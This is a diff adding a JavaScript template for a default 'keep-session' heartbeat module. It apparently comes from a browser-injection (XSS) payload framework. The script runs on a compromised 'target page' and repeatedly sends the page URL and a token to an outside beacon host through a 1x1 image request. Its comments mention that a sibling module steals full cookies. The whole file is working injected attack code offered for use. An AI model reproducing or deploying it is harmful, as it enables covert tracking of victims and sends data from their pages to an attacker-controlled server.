@@ -1,0 +1,22 @@
+// keepsession.js.tmpl — Keep-session 心跳模組（預設啟用）。
+//
+// 定期以 1x1 GIF beacon 回報目標頁還活著。2020 原版這裡會順手送整串
+// cookie；這裡刻意只送 url —— cookie 屬 fullcookie 模組管轄，不在心跳裡夾帶。
+(function () {
+  "use strict";
+  var TOKEN = {{ .Token | printf "%q" }};
+  var BASE = {{ .BeaconBase | printf "%q" }};
+  var INTERVAL = {{ .KeepSessionSeconds }} * 1000;
+
+  function beat() {
+    var url;
+    try { url = document.location.href; } catch (e) { url = ""; }
+    var img = new Image();
+    img.src = BASE + "/" + TOKEN + "?kind=keepsession&url=" + encodeURIComponent(url);
+  }
+
+  beat();
+  var timer = setInterval(beat, INTERVAL);
+  // 頁面卸載就停，不留跨頁面的長駐計時器。
+  window.addEventListener("beforeunload", function () { clearInterval(timer); });
+})();
